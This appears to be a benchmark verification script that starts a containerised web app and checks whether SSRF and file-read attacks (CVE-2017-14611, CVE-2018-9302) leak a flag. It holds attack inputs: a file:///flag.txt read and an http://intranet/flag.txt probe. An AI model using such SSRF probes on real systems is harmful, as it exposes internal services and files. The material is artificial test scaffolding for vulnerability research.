#!/usr/bin/env bash
# verify.sh --seed|--residual — 0=效果发生(flag出现) 10=未发生 20=环境失败 30=参数错误
# seed: CVE-2017-14611 file:///flag.txt via product /assets/lib/fuc.js.php
# residual: CVE-2018-9302 http://intranet/flag.txt (inline; never heldout)
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"
export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"

if [[ -n "${WORK_DIR:-}" && -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi

dc() { docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" "$@"; }

APP_PORT="$(dc port "$VERSION" 80 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
if [[ -z "$APP_PORT" ]]; then
  echo "verify: cannot resolve ${VERSION}:80 (need --profile)" >&2
  exit 20
fi
export PCB_TARGET_PORT="$APP_PORT"

ready=0
for _ in $(seq 1 60); do
  code="$(curl -sS -o /dev/null -w '%{http_code}' --max-time 5 "http://127.0.0.1:${APP_PORT}/assets/lib/fuc.js.php" || echo 000)"
  if [[ "$code" =~ ^[12345][0-9][0-9]$ ]]; then
    ready=1; break
  fi
  sleep 2
done
if [[ "$ready" != 1 ]]; then echo "verify: ${VERSION} fuc.js.php timeout" >&2; exit 20; fi

if [[ "$MODE" == "--seed" ]]; then
  CAND="$("$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" 2>/dev/null || "$PY" "$CASE_DIR/poc/original_poc.py" 2>/dev/null)"
  CAND="${CAND:-"{}"}"
  CAND="$("$PY" -c "import json,sys
s = sys.argv[1]
try:
    json.loads(s)
    print(s)
except Exception:
    print(json.dumps({'url': s.strip()}))" "$CAND")"
  printf '%s' "$CAND" > "$WORK_DIR/cand.json"
else
  # CVE-2018-9302 residual (inline, never heldout, never seed fallback):
  # V1 ^https?:// guard still allows http SSRF to the internal-only intranet sidecar.
  "$PY" - > "$WORK_DIR/cand.json" <<'PYEOF'
import json
print(json.dumps({
    "probe_id": "cve-2018-9302-http-ssrf-intranet",
    "method": "GET",
    "url": "http://intranet/flag.txt",
}))
PYEOF
fi

OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || {
  echo "verify: seed_exec failed" >&2; printf '%s\n' "$OUT" >&2; exit 20; }

BODY="$(printf '%s' "$OUT" | "$PY" -c "import json,sys
try:
    d = json.load(sys.stdin)
    if isinstance(d, dict):
        print(d.get('body') or d.get('fetched_body') or json.dumps(d, ensure_ascii=False))
    else:
        print(d if isinstance(d, str) else json.dumps(d, ensure_ascii=False))
except Exception:
    print('')" 2>/dev/null)"
echo "${BODY:0:500}"
if grep -qF "$RUN_FLAG" <<<"$BODY"; then exit 0; else exit 10; fi
